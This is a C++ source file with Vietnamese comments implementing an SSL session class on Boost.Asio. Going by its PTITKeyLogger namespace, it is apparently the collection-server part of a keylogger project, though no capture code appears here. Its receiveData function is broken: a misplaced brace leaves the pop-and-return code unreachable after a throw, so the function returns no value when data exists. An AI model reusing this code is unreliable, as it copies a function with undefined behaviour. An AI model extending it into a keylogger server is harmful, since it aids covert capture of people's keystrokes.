#include "Protocol.hpp"
#include "Session.hpp"
#include <boost/bind.hpp>

/* Session
+ Constructor của Session nhận một tham chiếu đến io_service, một id cho phiên,
một đối tượng context SSL và một tham chiếu đến biến điều kiện dùng để thông 
báo về sự kết thúc của session.
*/
Session::Session(boost::asio::io_service &ioService, unsigned id,
                boost::asio::ssl::context &context,
                condition_variable &threadDeath) :
    _socket(ioService, context),
    _id(id),
    _isDead(false),
    _writeReady(false),
    _threadDeath(threadDeath) {}

/* create
+  Phương thức tạo một session mới với các tham số được cung cấp. 
Mỗi session được gán một id duy nhất.
*/
Session::sessionPointer Session::create(boost::asio::io_service &ioService,
                                        boost::asio::ssl::context &context,
                                        condition_variable &threadDeath){
    static unsigned id = 0;
    return (sessionPointer(new Session(ioService, id++, context, threadDeath)));
}

/* getSocket
+ Trả về lớp lowest_layer của ssl_socket cho phép  thực hiện các thao tác hoặc 
cấu hình trực tiếp trên kết nối TCP mà không cần thông qua giao thức SSL.
*/
Session::ssl_socket::lowest_layer_type &Session::getSocket(){
    return (_socket.lowest_layer());
}

/* start
+ Bắt đầu quá trình xác thực handshake SSL bằng cách gọi async_handshake.
*/
void Session::start(){
    _socket.async_handshake(boost::asio::ssl::stream_base::server,
                            boost::bind(&Session::handleHandshake, this,
                            boost::asio::placeholders::error));
}

/* doRead
+ Bắt đầu đọc dữ liệu từ client bằng cách gọi async_read
*/
void Session::doRead(){
    _buffer.fill(0);
    boost::asio::async_read(_socket, boost::asio::buffer(_buffer, _buffer.size()),
                            boost::asio::transfer_at_least(1),
                            boost::bind(&Session::handleRead, shared_from_this(),
                                        boost::asio::placeholders::error));
}

/* handkeRead
+ Xử lý dữ liệu đọc được từ client sau khi hoàn thành quá trình đọc.
*/
void Session::handleRead(const boost::system::error_code &error){
    if (!error){
        vector<char> msg;
        for (auto &it : _buffer)
            msg.push_back(it);
        _dataQueue.emplace(msg);
        doRead();
    }else{
        notifyDeath();
    }
}

/* handleHandshake
+  Xử lý kết quả của quá trình handshake SSL.
*/
void Session::handleHandshake(const boost::system::error_code &error){
    if (!error){
        sendState(PTITKeyLogger::ASK_ID);
        _writeReady = true;
        doRead();
    }else if (_isDead == false){
        notifyDeath();
    }
}

/* sendState
+ Gửi trạng thái cho client thông qua kết nối SSL.
*/
void Session::sendState(int state){
    _stateBuf[0] = state;
    boost::asio::write(_socket, boost::asio::buffer(_stateBuf));
}

/* receiveData
+  Nhận dữ liệu từ hàng đợi dữ liệu.
*/
vector<char> Session::receiveData(){
    if (_dataQueue.empty()){
        throw runtime_error("Try to pop an empty queue");
        vector<char> tmp(_dataQueue.front());
        _dataQueue.pop();
        return (tmp);
    }
}

/* writeReady
+ Kiểm tra xem session có sẵn sàng ghi dữ liệu hay không.
*/
bool Session::writeReady() const {return (_writeReady);}

/* dataAvailable
+ Kiểm tra xem có dữ liệu nào đã sẵn sàng để đọc hay không.
*/
bool Session::dataAvailable() {return (!_dataQueue.empty());}

/* isDead
+ Kiểm tra xem session đã kết thúc hay chưa.
*/
bool Session::isDead() const {return (_isDead);}

/* getId
+ Trả về id của session.
*/
unsigned Session::getId() const {return (_id);}

/* notifyDeath
+ Thông báo rằng session đã kết thúc, đồng thời đặt lại các biến liên quan 
và thông báo cho tất cả các luồng đang chờ.
*/
void Session::notifyDeath(){
    _writeReady = false;
    _isDead = true;
    _threadDeath.notify_all();
}
